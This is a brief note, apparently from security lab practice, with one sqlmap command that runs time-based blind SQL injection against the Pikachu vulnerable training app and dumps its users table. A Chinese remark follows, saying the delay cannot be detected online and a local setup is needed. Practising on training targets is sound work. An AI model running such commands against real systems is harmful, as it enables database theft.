sqlmap -u "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/sqli/sqli_blind_t.php" --data="name=1&submit=查询" -p name --technique=T --time-sec=3 --batch --no-cast -D pikachu -T users --dump
不好弄，需要本地环境复现，线上环境没法探测时间上的延迟

